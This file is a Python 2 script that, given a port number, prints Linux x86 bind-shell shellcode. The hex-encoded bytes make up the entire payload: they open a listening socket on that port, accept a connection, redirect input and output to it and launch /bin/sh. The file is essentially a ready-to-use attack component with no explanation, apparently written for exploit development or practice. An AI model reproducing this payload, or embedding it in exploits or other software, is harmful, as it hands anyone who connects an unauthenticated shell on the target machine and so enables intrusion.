import os
import sys

def generate_shellcode(portNumberHexUpper, portNumberHexLower):

    shellcode = "\\x6a\\x66\\x58\\x31\\xdb\\x43\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x6a\\x66\\x58\\x43\\x52\\x66\\x68%s%s\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x43\\x43\\x6a\\x02\\x57\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x43\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\\xf9\\x02\\x7e\\xf5\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80" % (portNumberHexUpper, portNumberHexLower)

    print "Generating shellcode...\n"
    print shellcode + "\n"

def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <port number>" % sys.argv[0]
        print '(+) eg: %s 9999' % sys.argv[0]
        sys.exit(-1)

    portNumber = int(sys.argv[1])
    if 0 <= portNumber <= 65535:
        portNumberHex = "%04x" % portNumber
        portNumberHexUpper = "\\x" + str(portNumberHex[0:2])
        portNumberHexLower = "\\x" + str(portNumberHex[2:4])

        generate_shellcode(portNumberHexUpper, portNumberHexLower)

    else:
        print "(+) Please enter a port number between 0 and 65535\n"
        sys.exit(-1)  

if __name__ == "__main__":
    main()